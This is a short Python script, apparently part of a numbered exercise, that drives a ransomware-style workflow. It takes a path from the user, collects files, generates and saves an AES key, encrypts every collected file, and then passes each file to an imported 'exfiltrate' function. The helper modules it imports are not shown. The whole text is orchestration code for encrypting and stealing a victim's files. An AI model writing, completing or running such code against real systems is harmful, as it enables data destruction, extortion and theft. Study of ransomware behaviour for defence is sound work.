from task_2 import collect_files
from task_3 import encrypt_file, generate_aes_key, save_key
from task_4_exfiltirate import exfiltrate

# Task 2: File Collection
path = input("Specify the path to use: ")
collect_files(path)

# Task 3: Encryption
key = generate_aes_key()
save_key(key)

with open('files.log', 'r') as f:
    file_paths = [line.strip() for line in f if line.strip()]

for file_path in file_paths:
    encrypt_file(file_path, key)

# Task 4: Exfiltration
for file_path in file_paths:
    exfiltrate(file_path) 
